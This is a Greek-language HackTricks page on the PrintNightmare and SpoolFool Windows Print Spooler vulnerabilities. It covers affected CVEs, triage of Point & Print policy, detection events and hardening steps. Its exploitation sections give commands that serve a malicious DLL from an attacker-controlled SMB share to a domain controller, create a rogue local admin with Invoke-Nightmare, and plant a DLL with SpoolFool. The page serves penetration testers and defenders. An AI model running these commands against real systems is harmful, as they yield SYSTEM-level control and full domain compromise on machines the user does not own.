# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> Το PrintNightmare είναι η συλλογική ονομασία μιας οικογένειας ευπαθειών στην υπηρεσία **Print Spooler** των Windows, οι οποίες επιτρέπουν **arbitrary code execution as SYSTEM** και, όταν το spooler είναι προσβάσιμο μέσω RPC, **remote code execution (RCE) σε domain controllers και file servers**. Τα CVEs που έχουν γίνει αντικείμενο της ευρύτερης εκμετάλλευσης είναι τα **CVE-2021-1675** (αρχικά ταξινομημένο ως LPE) και **CVE-2021-34527** (πλήρες RCE). Μεταγενέστερα ζητήματα, όπως τα **CVE-2021-34481 (“Point & Print”)** και **CVE-2022-21999 (“SpoolFool”)**, αποδεικνύουν ότι το attack surface απέχει ακόμη πολύ από το να έχει κλείσει.

Αν αναζητάτε **authentication coercion / relay** μέσω του spooler και όχι **driver-based RCE/LPE**, δείτε [αυτήν τη σελίδα σχετικά με printer coercion abuse](printers-spooler-service-abuse.md). Αυτή η σελίδα επικεντρώνεται στο **loading drivers / DLLs as SYSTEM**.

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Έγινε patched στο June 2021 CU, αλλά παρακάμφθηκε μέσω του CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|Το `AddPrinterDriverEx` επιτρέπει σε authenticated users να φορτώνουν ένα driver DLL από remote share· μετά τον Αύγουστο του 2021 αυτό συνήθως απαιτεί weakened Point & Print policies|
|2021|CVE-2021-34481|“Point & Print”|LPE|Unsigned driver installation από non-admin users|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitrary directory creation → DLL planting – λειτουργεί μετά τα 2021 patches|

Όλα εκμεταλλεύονται μία από τις **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ή τις trust relationships μέσα στο **Point & Print**.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

Ένας authenticated αλλά **non-privileged** domain user μπορεί να εκτελέσει arbitrary DLLs ως **NT AUTHORITY\SYSTEM** σε έναν remote spooler (συχνά τον DC), εκτελώντας τα εξής:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popular PoCs περιλαμβάνουν τα **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) και τα modules `misc::printnightmare / lsa::addsid` του Benjamin Delpy στο **mimikatz**.

### 2.2 Local privilege escalation (οποιοδήποτε υποστηριζόμενο Windows, 2021-2024)

Το ίδιο API μπορεί να κληθεί **τοπικά** για να φορτώσει έναν driver από το `C:\Windows\System32\spool\drivers\x64\3\` και να επιτύχει δικαιώματα SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Σύγχρονο triage σε patched hosts

Σε έναν πλήρως ενημερωμένο host, τα public PrintNightmare PoCs συχνά αποτυγχάνουν, επειδή τα Windows πλέον χρησιμοποιούν από προεπιλογή **εγκατάσταση printer driver μόνο από administrators** (`RestrictDriverInstallationToAdministrators=1` από τις 10 Αυγούστου 2021). Πριν εκτελέσετε ένα exploit σε έναν target, ελέγξτε πρώτα αν το περιβάλλον έχει αναιρέσει αυτή την αλλαγή ασφαλείας για legacy printer deployments:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Οι δύο πιο ενδιαφέρουσες αδύναμες τιμές είναι συνήθως:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Από Linux, επιβεβαιώστε γρήγορα ότι ο στόχος εκθέτει τα σχετικά print RPC interfaces πριν εκτελέσετε ένα PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Ορισμένα νεότερα δημόσια εργαλεία σάς προσφέρουν επίσης μια ασφαλέστερη ροή εργασίας **check/list** πριν από την αποστολή ενός DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Αν λάβετε `RPC_E_ACCESS_DENIED` (`0x8001011b`) ως χρήστης με χαμηλά δικαιώματα, συνήθως βλέπετε την προεπιλεγμένη συμπεριφορά μετά το 2021 και όχι αποτυχία μεταφοράς.

> Στα Windows 11 22H2+ και σε νεότερα client builds, η απομακρυσμένη εκτύπωση χρησιμοποιεί από προεπιλογή **RPC over TCP** και το **RPC over named pipes** (`\PIPE\spoolss`) είναι απενεργοποιημένο, εκτός αν ενεργοποιηθεί ξανά ρητά. Ορισμένα παλαιότερα PoCs και lab notes εξακολουθούν να θεωρούν ότι το named pipe είναι προσβάσιμο.<sup>[[4]](#references)</sup>

### 2.4 Κατάχρηση του Package Point & Print σε “patched” δίκτυα

Πολλά enterprise περιβάλλοντα παρέμειναν **vulnerable by policy** μετά τα αρχικά patches του 2021, επειδή οι ροές εργασίας του helpdesk ή του print server εξακολουθούσαν να απαιτούν από χρήστες χωρίς δικαιώματα admin να εγκαθιστούν ή να ενημερώνουν drivers. Στην πράξη, το offensive playbook γίνεται:

- Αν τα security prompts είναι πλήρως απενεργοποιημένα, το **classic arbitrary-DLL PrintNightmare** παραμένει η συντομότερη διαδρομή.
- Αν είναι ενεργοποιημένο το `Only use Package Point and Print`, συνήθως πρέπει να κάνετε pivot σε διαδρομή **signed package-aware driver** αντί για ένα απλό raw DLL drop.<sup>[[3]](#references)</sup>
- Η έρευνα του 2024 έδειξε ότι το **`Package Point and Print - Approved servers` δεν αποτελεί από μόνο του hard trust boundary**: αν ένας attacker μπορεί να κάνει spoof ή hijack το name resolution για έναν εγκεκριμένο print server, τα victims μπορούν και πάλι να ανακατευθυνθούν σε malicious server που ικανοποιεί τους policy checks.<sup>[[4]](#references)</sup>
- Ακόμη και ο συνδυασμός UNC hardening με forced RPC-over-SMB μπορεί να είναι εύθραυστος, επειδή οι σύγχρονοι clients ενδέχεται να κάνουν **fallback σε RPC over TCP**.<sup>[[4]](#references)</sup>

Γι’ αυτό η σύγχρονη exploitation τύπου PrintNightmare αφορά συχνά περισσότερο την **κατάχρηση enterprise printer deployment policy** παρά την αναπαραγωγή του αρχικού PoC του 2021 χωρίς αλλαγές.

### 2.5 SpoolFool (CVE-2022-21999) – παράκαμψη των fixes του 2021

Τα patches της Microsoft του 2021 απέτρεψαν το remote driver loading, αλλά **δεν ενίσχυσαν τα directory permissions**. Το SpoolFool καταχράται την παράμετρο `SpoolDirectory` για να δημιουργήσει έναν arbitrary directory κάτω από το `C:\Windows\System32\spool\drivers\`, κάνει drop ένα payload DLL και αναγκάζει τον spooler να το φορτώσει:<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Το exploit λειτουργεί σε πλήρως patched Windows 7 → Windows 11 και Server 2012R2 → 2022 πριν από τα updates του Φεβρουαρίου 2022<sup>[[2]](#references)</sup>

---

## 3. Detection & hunting

* **PrintService logs** – ενεργοποιήστε το κανάλι *Microsoft-Windows-PrintService/Operational* και αναζητήστε το **Event ID 316** (προσθήκη/ενημέρωση driver, συνήθως περιλαμβάνει τα ονόματα των DLL) τόσο σε επιτυχημένες όσο και σε αποτυχημένες προσπάθειες. Συνδυάστε το με τα **Event ID 808/811** για ύποπτες αποτυχίες φόρτωσης module/driver του spooler.
* **Sysmon** – `Event ID 7` (Image loaded) ή `11/23` (File write/delete) μέσα στο `C:\Windows\System32\spool\drivers\*`, όταν η parent process είναι η **spoolsv.exe**.
* **Process lineage** – δημιουργήστε alert κάθε φορά που η **spoolsv.exe** εκκινεί `cmd.exe`, `rundll32.exe`, PowerShell ή οποιαδήποτε μη αναμενόμενη unsigned child process.
* **Network telemetry** – μη αναμενόμενα SMB fetches από τη `spoolsv.exe` προς attacker-controlled shares ή ασυνήθιστη printer RPC traffic από servers που δεν θα έπρεπε να λειτουργούν ως print servers αποτελούν ισχυρές ενδείξεις για περαιτέρω έρευνα.

## 4. Mitigation & hardening

1. **Κάντε patch!** – Εφαρμόστε το πιο πρόσφατο cumulative update σε κάθε Windows host όπου είναι εγκατεστημένη η υπηρεσία Print Spooler.
2. **Απενεργοποιήστε τον spooler όπου δεν απαιτείται**, ειδικά στους Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Αποκλείστε τις remote connections**, επιτρέποντας ταυτόχρονα το local printing – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Διατηρήστε το Point & Print διαθέσιμο μόνο σε administrators** ορίζοντας:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Λεπτομερείς οδηγίες στο Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Αν οι επιχειρησιακές απαιτήσεις επιβάλλουν `RestrictDriverInstallationToAdministrators=0`, θεωρήστε κάθε άλλη printer policy **μόνο ως partial mitigation**. Κατ’ ελάχιστον, προτιμήστε **package-aware drivers**, ενεργοποιήστε το **Only use Package Point and Print** και περιορίστε το **Package Point and Print - Approved servers** σε ρητά καθορισμένους in-forest print servers.<sup>[[3]](#references)</sup>
6. **Μην κάνετε rollback το printer RPC privacy** μόνο και μόνο για να διορθώσετε broken printer mappings. Τα environments που ορίζουν `RpcAuthnLevelPrivacyEnabled=0` αναιρούν το hardening που προστέθηκε για το **CVE-2021-1678** και συνήθως απαιτούν extra scrutiny κατά τη διάρκεια ενός engagement.<sup>[[4]](#references)</sup>

---

## 5. Related research / tools

* modules του [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standard Impacket implementation με modes `-check`, `-list` και `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper με ενσωματωμένο SMB delivery, multi-target support και modes `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuse vulnerable printer driver μέσω package Point & Print, με τη μέθοδο bring-your-own
* SpoolFool exploit & write-up
* 0patch micropatches για το SpoolFool και άλλα spooler bugs

Αν θέλετε να **κάνετε coerce authentication** μέσω του spooler αντί να φορτώσετε driver, μεταβείτε στο [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
